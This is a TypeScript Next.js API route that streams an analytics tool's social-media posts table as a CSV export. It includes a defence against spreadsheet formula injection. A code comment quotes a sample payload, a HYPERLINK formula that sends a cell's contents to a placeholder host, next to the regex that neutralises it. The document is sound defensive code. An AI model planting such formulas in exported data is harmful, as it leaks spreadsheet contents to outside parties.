/**
 * GET /api/posts/export
 *
 * The posts table as CSV, streamed.
 *
 * Streaming rather than buffering because a year of a ten-company landscape is
 * comfortably six figures of rows: building that string in memory inside a
 * serverless function is how you get an OOM at exactly the moment an editor is
 * trying to send something to their boss. Rows are pulled a page at a time and
 * pushed to the client as they arrive, so memory is flat and the browser starts
 * the download immediately.
 *
 * Everything is quoted. Post text contains commas, quotes and newlines by
 * nature, and half-escaped CSV is worse than none.
 */
import type { NextRequest } from 'next/server';
import { apiHandler, requireOrg } from '@/lib/session';
import { getPosts } from '@/lib/metrics/queries';
import type { PostDto } from '@/lib/metrics/contract';
import { toDayString } from '@/lib/dates';
import { slugify } from '@/lib/utils';
import { resolveAnalyticsQuery } from '../../_lib/query';
import { readPostsParams } from '../../_lib/posts-params';
import {
  isPostMetricReported,
  type PostComponentMetric,
} from '@/components/posts/post-metric-availability';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';
/** A year of a ten-company landscape is a long stream; give it room. */
export const maxDuration = 120;

/** Rows per database page. Large enough to be few round trips, small enough to stream. */
const PAGE_SIZE = 500;

/**
 * Hard ceiling on an export. Not a limitation so much as a circuit breaker: past
 * this point the honest answer is "narrow the window", not a file nobody can open.
 */
const MAX_ROWS = 100_000;

const COLUMNS = [
  'posted_at', 'company', 'platform', 'post_type', 'permalink', 'text',
  'applause', 'conversation', 'amplification', 'saves', 'views',
  'engagement_total', 'engagement_rate_by_follower', 'followers_at_post',
  'outlier_score', 'tags', 'domains',
] as const;

/**
 * RFC 4180: quote everything, double any embedded quote.
 *
 * Then one thing RFC 4180 does not cover. Post text and company names are
 * attacker-controlled -- they are whatever a competitor typed into Instagram --
 * and Excel, Numbers and Sheets all treat a cell beginning `=`, `+`, `-` or `@`
 * as a formula no matter how correctly it was quoted. A competitor who posts
 * `=HYPERLINK("http://x/?"&A1,"click")` would otherwise get that formula
 * evaluated inside an editor's spreadsheet. Prefixing a single quote makes the
 * cell inert; the leading quote is not displayed by any of the three.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function cell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '""';
  // Numbers we produced ourselves are never neutralized, so a metric column
  // stays a metric column and a negative value still sorts as one.
  const text = String(value);
  const safe = typeof value === 'string' && FORMULA_LEAD.test(text) ? "'" + text : text;
  return '"' + safe.replace(/"/g, '""') + '"';
}

function reportedPostMetric(p: PostDto, metric: PostComponentMetric): number | null {
  const value = p[metric];
  return isPostMetricReported(p.platform, p.type, metric, value) ? value : null;
}

function row(p: PostDto): string {
  return [
    cell(p.postedAt),
    cell(p.company.name),
    cell(p.platform),
    cell(p.type),
    cell(p.permalink),
    cell(p.text),
    cell(reportedPostMetric(p, 'applause')),
    cell(reportedPostMetric(p, 'conversation')),
    cell(reportedPostMetric(p, 'amplification')),
    cell(reportedPostMetric(p, 'saves')),
    cell(reportedPostMetric(p, 'views')),
    cell(p.engagementTotal),
    cell(p.followersAtPost !== null && p.followersAtPost > 0
      ? p.engagementRateByFollower
      : null),
    cell(p.followersAtPost),
    cell(p.outlierScore),
    cell(p.tags.map((t) => t.name).join('; ')),
    cell([...new Set(p.urls.map((u) => u.domain))].join('; ')),
  ].join(',') + '\r\n';
}

export const GET = apiHandler(async (req: NextRequest) => {
  const { orgId } = await requireOrg();
  const { query, landscape } = await resolveAnalyticsQuery(req, orgId);
  const { search, sort, direction } = readPostsParams(req);

  const filename = [
    'pressbox',
    slugify(landscape.name) || 'landscape',
    'posts',
    toDayString(query.start),
    'to',
    toDayString(query.end),
  ].join('-') + '.csv';

  const encoder = new TextEncoder();
  const stream = new ReadableStream<Uint8Array>({
    async pull(controller) {
      // A single pull drains the whole result set; pausing between pages would
      // hold a database connection open for the duration of a slow download.
      controller.enqueue(encoder.encode(COLUMNS.join(',') + '\r\n'));
      let page = 1;
      let written = 0;
      try {
        for (;;) {
          const result = await getPosts({
            ...query, search, sort, direction, page, pageSize: PAGE_SIZE,
          });
          for (const post of result.items) {
            controller.enqueue(encoder.encode(row(post)));
            written += 1;
          }
          const done = result.items.length < PAGE_SIZE
            || written >= result.total
            || written >= MAX_ROWS;
          if (done) break;
          page += 1;
        }
        controller.close();
      } catch (err) {
        // The status line is already sent, so the only honest signal left is to
        // break the stream. A truncated download beats a silently short file.
        controller.error(err);
      }
    },
  });

  return new Response(stream, {
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': 'attachment; filename="' + filename + '"',
      'cache-control': 'private, no-store',
    },
  });
});
